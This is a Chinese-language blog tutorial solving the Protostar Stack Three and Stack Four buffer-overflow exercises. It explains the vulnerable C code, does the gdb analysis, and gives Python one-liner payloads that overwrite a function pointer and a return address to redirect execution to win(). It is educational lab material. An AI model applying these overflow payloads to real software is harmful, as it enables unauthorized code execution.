![在这里插入图片描述](https://img-blog.csdnimg.cn/edc95b961b5e4b31ab1915d45e3445db.png)
# 前言
这是一个系列文章，之前已经介绍过一些二进制安全的基础知识，这里就不过多重复提及，不熟悉的同学可以去看看我之前写的文章

~~~
二进制安全虚拟机Protostar靶场 安装,基础知识讲解,破解STACK ZERO
https://blog.csdn.net/qq_45894840/article/details/129490504?spm=1001.2014.3001.5501
~~~
~~~
二进制安全虚拟机Protostar靶场（2）基础知识讲解，栈溢出覆盖变量 Stack One,Stack Two
https://blog.csdn.net/qq_45894840/article/details/132688653?spm=1001.2014.3001.5501
~~~
# Stack Three
## 程序静态分析
~~~
https://exploit.education/protostar/stack-three/
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/9ab01fb6b054470897ae6e646723a632.png)

~~~
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
~~~
### 源代码分析
这个程序首先定义了一个win函数
~~~
void win()
{
  printf("code flow successfully changed\n");
}
~~~
调用这个win函数会输出code flow successfully changed，表示我们成功破解了程序

然后在mian函数内定义了一个指针变量fp和字符型变量buffer，buffer存储的字符大小为64位
~~~
volatile int (*fp)();
char buffer[64];
~~~
### 什么是指针？
在C语言中，指针是一种特殊的变量类型，它存储了一个内存地址。这个内存地址可以是其他变量或数据结构在内存中的位置

指针提供了直接访问和操作内存中数据的能力。通过指针，我们可以间接地访问、修改和传递数据，从而不需要直接对变量本身进行操作

~~~
fp = 0;
~~~

将fp的值设为0表示一个无效的指针，即它不指向任何有效的内存地址。这样做可以用来初始化指针变量，或者将指针重置为空指针

之后程序会使用gets函数接收用户的输入，并将接受到的字符串存储在buffer变量里，gets函数是一个危险的函数，他会造成缓冲区溢出，具体的解释可以看我的第一篇文章

程序接受输入后会进行一个if判断

~~~
gets(buffer);

if(fp) {
    printf("calling function pointer, jumping to 0x%08x\n", fp);
    fp();
}
~~~


if(fp)检查fp是否指向了某个有效的函数。如果fp不为空（即非零），则输出calling function pointer, jumping to 0x%08x，然后执行函数指针 fp 所指向的函数

也就是说，我们需要溢出覆盖fp设置的值，将fp原本的值改为win函数的地址，之后进入if判断后，会执行win函数

### 汇编分析
使用gdb打开程序，输入指令查看汇编代码
~~~
set disassembly-flavor intel
disassemble main
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/a70bd0dd02634bf7b84b79e021893122.png)

程序最关键的地方是这两行

![在这里插入图片描述](https://img-blog.csdnimg.cn/5a67ecbcffa842c1a2af2c8389514a23.png)

~~~
0x08048471 <main+57>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:   call   eax
~~~


它将esp+0x5c地址的值转移到了eax寄存器里，然后调用call指令执行eax寄存器里的值


也就是说，我们只要将esp+0x5c地址的内容覆盖成win函数的地址，就能成功破解程序

## 程序动态分析

我们在0x08048471地址处下一个断点
~~~
b *0x08048471 
~~~
然后设置一下自动运行的命令
~~~
define hook-stop
info registers   //显示寄存器里的地址
x/24wx $esp      //显示esp寄存器里的内容
x/2i $eip        //显示eip寄存器里的内容
end              //结束
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/03d6964e3ef74a61af0e7db0ee455f9f.png)

运行程序，由于if判断，fp的值不能为零才能进入if判断，但是程序设置的fp的值为0，我们先输入一长串的垃圾字符，覆盖原来的值

![在这里插入图片描述](https://img-blog.csdnimg.cn/3c879d390dc8483a86e233883bd09bff.png)

查看esp+0x5c地址处的值
~~~
x/wx $esp+0x5c
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/cbfb1bfc94da4cc5b26e7ad3a6918533.png)

fp函数指针的值就在图中圈出来的地方，根据计算，我们需要64个字符+win函数地址才能控制fp函数指针

这时候我们可以用objdump工具来查看win函数地址
~~~
objdump -x stack3 | grep win
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/c5c5d7961f444f9984e59b713e4b9809.png)

或者直接使用gdb直接查看win函数就能知道地址
~~~
disassemble win
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/1be35a8680c640608037303ca50d5bed.png)

两个方法都能用

 知道了win函数地址后，直接运行以下命令就能破解程序
~~~
64个垃圾字符+win函数地址
python -c "print('A'*(4*16)+'\x24\x84\x04\x08')" | ./stack3
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/7112b39119de4369b0dcc53fd42e5e3f.png)

# Stack Four
## 程序静态分析
~~~
https://exploit.education/protostar/stack-four/
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/b3451f0f07d94150a358ea9d4e258192.png)
~~~
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
~~~

这个程序很简单，就不多做介绍了，和上一个一模一样，只不过将设置的fp函数指针去掉了，我们需要自己控制程序指针进行跳转到win函数地址

直接进行程序动态分析
## 程序动态分析
使用gdb打开程序，输入指令查看汇编代码
~~~
set disassembly-flavor intel
disassemble main
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/6603edf8f151431a95aaad3856e1b9d0.png)

代码很少，我们要做的只有一件事，控制ret指令的返回地址，让程序跳转到win函数地址执行参数
## leave和ret指令
在汇编语言中，ret指令用于从子程序返回到调用它的主程序。当执行到ret指令时，程序会跳转到主代码的地址，继续执行主程序的代码

在汇编语言中，leave指令用于清空栈，它会清除我们这次运行程序时获取的用户输入之类的，还原之前的状态

我们在leave指令的地址下一个断点
~~~
b *0x0804841d
~~~

运行程序，然后随便输入一些字符，然后查看栈里的内容，记录下来，之后会用到

![在这里插入图片描述](https://img-blog.csdnimg.cn/82bfce200f744bf38b7fd2e0e53bd3ed.png)


然后输入n执行下一个指令，让ret指令执行，输入info registers查看寄存器的值

![在这里插入图片描述](https://img-blog.csdnimg.cn/df91929baf4442fbb64c93c7e3c2d287.png)

当前eip寄存器的值为0xb7eadc76，也就是说，执行了rat指令后，程序回到了0xb7eadc76继续执行之后的命令

但是返回的地址也是在栈中的

![在这里插入图片描述](https://img-blog.csdnimg.cn/b61a24b8fa5043688e52565c80a0cc75.png)

根据计算，我们需要输入76个字符+win函数地址才能覆盖原来ret返回的地址，让程序跳转到win函数地址处执行

~~~
python -c "print('A'*76+'\xf4\x83\x04\x08')" | ./stack4
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/a720b73325e543778112f38a29c6b44b.png)

成功破解
